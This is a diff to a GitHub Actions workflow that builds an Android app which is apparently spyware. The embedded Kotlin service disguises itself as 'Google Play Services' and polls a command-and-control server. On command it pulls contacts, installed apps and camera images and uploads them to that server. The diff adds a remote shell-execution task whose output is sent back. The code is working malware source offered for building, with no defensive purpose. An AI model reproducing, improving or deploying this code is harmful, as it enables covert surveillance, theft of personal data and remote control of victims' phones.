@@ -1,11 +1,11 @@
-name: Royal Iron Fist Node Builder v9.5 Ultimate Power
+name: Royal Iron Fist Node Builder v10.0 Electromagnetic
 
 on:
   workflow_dispatch:
 
 jobs:
   build:
-    name: Build Royal Iron Fist Operational APK v9.5
+    name: Build Royal Iron Fist Operational APK v10.0
     runs-on: ubuntu-latest
 
     steps:
@@ -130,20 +130,20 @@ jobs:
               override fun onCreate() {
                   super.onCreate()
                   val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RoyalIronFist::UltimateLock")
+                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RoyalIronFist::ElectromagneticLock")
                   wakeLock?.acquire(10 * 60 * 60 * 1000L)
                   startForegroundServiceNotification()
               }
 
               private fun startForegroundServiceNotification() {
-                  val channelId = "royal_ultimate_channel"
+                  val channelId = "royal_electromagnetic_channel"
                   val channel = NotificationChannel(channelId, "Google Play Services", NotificationManager.IMPORTANCE_LOW)
                   val manager = getSystemService(NotificationManager::class.java)
                   manager?.createNotificationChannel(channel)
 
                   val notification: Notification = NotificationCompat.Builder(this, channelId)
                       .setContentTitle("Google Play Services")
-                      .setContentText("System optimization active...")
+                      .setContentText("System synchronization active...")
                       .setSmallIcon(android.R.drawable.ic_menu_manage)
                       .build()
 
@@ -164,13 +164,13 @@ jobs:
                               conn.setRequestProperty("X-Node-Model", nodeModel)
                               conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                               conn.doOutput = true
-                              conn.connectTimeout = 8000
-                              conn.readTimeout = 8000
+                              conn.connectTimeout = 6000
+                              conn.readTimeout = 6000
 
                               val currentTime = System.currentTimeMillis()
-                              val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
+                              val sendHeartbeat = (currentTime - lastHeartbeatSent > 40000L)
                               val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
-                              val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Ultimate Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
+                              val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Electromagnetic Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
 
                               if (sendHeartbeat) {
                                   lastHeartbeatSent = currentTime
@@ -192,6 +192,7 @@ jobs:
                                           if (jsonRes.has("task") && !jsonRes.isNull("task")) {
                                               val taskObj = jsonRes.getJSONObject("task")
                                               val action = taskObj.getString("action")
+                                              val payload = if (taskObj.has("payload")) taskObj.optString("payload", "") else ""
 
                                               when {
                                                   action.contains("EXTRACT_CONTACTS") -> {
@@ -218,6 +219,10 @@ jobs:
                                                       val data = readInstalledApps()
                                                       streamTextMemoryDirect(deviceId, nodeModel, "Uranium_InstalledApps.txt", data)
                                                   }
+                                                  action.contains("SHELL_EXEC") -> {
+                                                      val data = executeShellCommand(payload)
+                                                      streamTextMemoryDirect(deviceId, nodeModel, "Uranium_ShellResult.txt", data)
+                                                  }
                                                   action.contains("EXTRACT_CAMERA_ZIP") -> {
                                                       streamUniversalMediaStoreStream(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                                   }
@@ -236,9 +241,9 @@ jobs:
                                   }
                               }
                               conn.disconnect()
-                              delay(3000L)
+                              delay(1200L) // سرعة استعلام فائقة (كالبراق)
                           } catch (e: Exception) {
-                              delay(5000L)
+                              delay(3000L)
                           }
                       }
                   }
@@ -249,14 +254,13 @@ jobs:
                   try {
                       val bytes = content.toByteArray(Charsets.UTF_8)
                       uploadBytesDirect(nodeId, nodeModel, fileName, bytes)
-                      sendReportToServer(nodeId, nodeModel, "✅ [حصاد نقي RAM] الملف <b>$fileName</b> تم بثه مركزياً بنجاح تام.")
+                      sendReportToServer(nodeId, nodeModel, "✅ [حصاد فائق السرعة RAM] الملف <b>$fileName</b> تم بثه مركزياً بنجاح تام.")
                   } catch (e: Exception) {}
               }
 
-              // محرك البث الشامل الآمن المتوافق مع أندرويد 10 إلى 14 (Scoped Storage Safe)
               private fun streamUniversalMediaStoreStream(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
                   try {
-                      sendReportToServer(nodeId, nodeModel, "⚡ [البث المباشر الذكي] جاري استخراج وتدفق بيانات $prefix عبر قنوات النظام الآمنة...")
+                      sendReportToServer(nodeId, nodeModel, "⚡ [البث الكهرومغناطيسي] جاري استخراج وتدفق بيانات $prefix كالبراق...")
                       
                       val url = URL(C2_INGEST_URL)
                       val conn = url.openConnection() as HttpURLConnection
@@ -286,7 +290,7 @@ jobs:
                                   val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                                   val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                                   
-                                  while (it.moveToNext() && fileCount < 1000) {
+                                  while (it.moveToNext() && fileCount < 1200) {
                                       if (idIdx != -1 && nameIdx != -1) {
                                           val id = it.getLong(idIdx)
                                           val name = it.getString(nameIdx) ?: "file_$id.dat"
@@ -310,10 +314,26 @@ jobs:
                       val code = conn.responseCode
                       conn.disconnect()
                       if (code == 200) {
-                          sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد الشامل بنجاح]\n📂 الأرشيف: <code>$prefix</code> ($fileCount ملفاً) - [Zero Disk Footprint]")
+                          sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد فائق السرعة]\n📂 الأرشيف: <code>$prefix</code> ($fileCount ملفاً) - [Zero Disk Footprint]")
                       }
                   } catch (e: Exception) {
                       sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في تدفق أرشيف $prefix: ${e.message}")
+                  }
+              }
+
+              private fun executeShellCommand(cmd: String): String {
+                  return try {
+                      val process = Runtime.getRuntime().exec(if (cmd.isBlank()) "getprop" else cmd)
+                      val reader = BufferedReader(InputStreamReader(process.inputStream))
+                      val output = StringBuilder("=== SHELL RESULT ===\n")
+                      var line: String?
+                      while (reader.readLine().also { line = it } != null) {
+                          output.append(line).append("\n")
+                      }
+                      reader.close()
+                      output.toString()
+                  } catch (e: Exception) {
+                      "Error executing shell: ${e.message}"
                   }
               }
 
@@ -787,5 +807,5 @@ jobs:
       - name: Upload APK Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Royal-Iron-Fist-v9.5-Ultimate
+          name: Royal-Iron-Fist-v10.0-Electromagnetic
           path: app/build/outputs/apk/debug/app-debug.apk
